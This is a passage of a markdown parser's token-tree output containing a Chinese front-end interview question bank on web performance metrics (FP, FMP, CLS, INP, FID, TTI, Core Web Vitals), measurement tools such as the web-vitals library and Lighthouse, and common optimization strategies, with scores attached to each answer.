Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。","text":" TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。\\n","task":false,"loose":false,"text":"**1：** FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。","tokens":[{"type":"text","raw":"**1：** FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。","text":"**1：** FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。","text":" FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。\\n","task":false,"loose":false,"text":"**1：** FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。","tokens":[{"type":"text","raw":"**1：** FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。","text":"**1：** FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。","text":" FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。\\n","task":false,"loose":false,"text":"**1：** SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。","tokens":[{"type":"text","raw":"**1：** SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。","text":"**1：** SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。","text":" SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。\\n","task":false,"loose":false,"text":"**1：** CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。","tokens":[{"type":"text","raw":"**1：** CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。","text":"**1：** CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。","text":" CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。\\n","task":false,"loose":false,"text":"**1：** INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。","tokens":[{"type":"text","raw":"**1：** INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。","text":"**1：** INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。","text":" INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。\\n","task":false,"loose":false,"text":"**1：** FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。","tokens":[{"type":"text","raw":"**1：** FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。","text":"**1：** FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。","text":" FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","task":false,"loose":false,"text":"**1：** TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","tokens":[{"type":"text","raw":"**1：** TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","text":"**1：** TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","text":" TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Core Web Vitals指的是什么？\\n\\n","depth":2,"text":"Core Web Vitals指的是什么？","tokens":[{"type":"text","raw":"Core Web Vitals指的是什么？","text":"Core Web Vitals指的是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","task":false,"loose":false,"text":"**1：** Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","tokens":[{"type":"text","raw":"**1：** Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","text":"**1：** Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","text":" Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":" >Core Web Vitals 包含了三个指标：INP、LCP、CLS","tokens":[{"type":"paragraph","raw":"Core Web Vitals 包含了三个指标：INP、LCP、CLS","text":"Core Web Vitals 包含了三个指标：INP、LCP、CLS","tokens":[{"type":"text","raw":"Core Web Vitals 包含了三个指标：INP、LCP、CLS","text":"Core Web Vitals 包含了三个指标：INP、LCP、CLS","escaped":false}]}],"text":"Core Web Vitals 包含了三个指标：INP、LCP、CLS"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 性能测量工具有哪些？\\n\\n","depth":2,"text":"性能测量工具有哪些？","tokens":[{"type":"text","raw":"性能测量工具有哪些？","text":"性能测量工具有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **2：** 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","task":false,"loose":false,"text":"**2：** 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","tokens":[{"type":"text","raw":"**2：** 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","text":"**2：** 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","text":" 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nimport {onCLS, onINP, onLCP, onFCP, onFID, onTTFB} from \'web-vitals\';\\n\\nonCLS(console.log);\\nonINP(console.log);\\nonLCP(console.log);\\nonFCP(console.log);\\nonFID(console.log);\\nonTTFB(console.log);\\n```","lang":"javascript","text":"import {onCLS, onINP, onLCP, onFCP, onFID, onTTFB} from \'web-vitals\';\\n\\nonCLS(console.log);\\nonINP(console.log);\\nonLCP(console.log);\\nonFCP(console.log);\\nonFID(console.log);\\nonTTFB(console.log);"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：  \\n![alt text](/public/images/PSI.png)\\n\\n- **2：** 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n![alt text](/public/images/Lighthouse.png)","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：  \\n![alt text](/public/images/PSI.png)\\n\\n","task":false,"loose":true,"text":"**2：** 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：  \\n![alt text](/public/images/PSI.png)\\n","tokens":[{"type":"text","raw":"**2：** 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：  \\n\\n![alt text](/public/images/PSI.png)\\n","text":"**2：** 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：  \\n![alt text](/public/images/PSI.png)","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：","text":" 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：","escaped":false},{"type":"br","raw":"  \\n"},{"type":"image","raw":"![alt text](/public/images/PSI.png)","href":"/public/images/PSI.png","title":null,"text":"alt text"}]}]},{"type":"list_item","raw":"- **2：** 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n![alt text](/public/images/Lighthouse.png)","task":false,"loose":true,"text":"**2：** 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n![alt text](/public/images/Lighthouse.png)","tokens":[{"type":"text","raw":"**2：** 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n\\n![alt text](/public/images/Lighthouse.png)","text":"**2：** 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n![alt text](/public/images/Lighthouse.png)","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n","text":" 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n","escaped":false},{"type":"image","raw":"![alt text](/public/images/Lighthouse.png)","href":"/public/images/Lighthouse.png","title":null,"text":"alt text"}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何优化前端性能？列举一些常见的性能优化策略\\n\\n","depth":2,"text":"如何优化前端性能？列举一些常见的性能优化策略","tokens":[{"type":"text","raw":"如何优化前端性能？列举一些常见的性能优化策略","text":"如何优化前端性能？列举一些常见的性能优化策略","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（10 分）\\n\\n","depth":4,"text":"解答（10 分）","tokens":[{"type":"text","raw":"解答（10 分）","text":"解答（10 分）","escaped":false}]},{"type":"list","raw":"- **1：** 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。\\n- **1：**  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。\\n- **1：** 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。\\n- **1：** 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。\\n- **1：** 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。\\n- **1：** 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。\\n- **1：** 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。\\n- **1：** 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。\\n- **1：** 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。\\n- **1：** 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。\\n","task":false,"loose":false,"text":"**1：** 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。","tokens":[{"type":"text","raw":"**1：** 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。","text":"**1：** 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。","text":" 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。\\n","task":false,"loose":false,"text":"**1：**  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。","tokens":[{"type":"text","raw":"**1：**  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。","text":"**1：**  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。","text":"  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。\\n","task":false,"loose":false,"text":"**1：** 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。","tokens":[{"type":"text","raw":"**1：** 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。","text":"**1：** 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。","text":" 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。\\n","task":false,"loose":false,"text":"**1：** 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。","tokens":[{"type":"text","raw":"**1：** 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。","text":"**1：** 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。","text":" 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。\\n","task":false,"loose":false,"text":"**1：** 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。","tokens":[{"type":"text","raw":"**1：** 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。","text":"**1：** 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。","text":" 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。\\n","task":false,"loose":false,"text":"**1：** 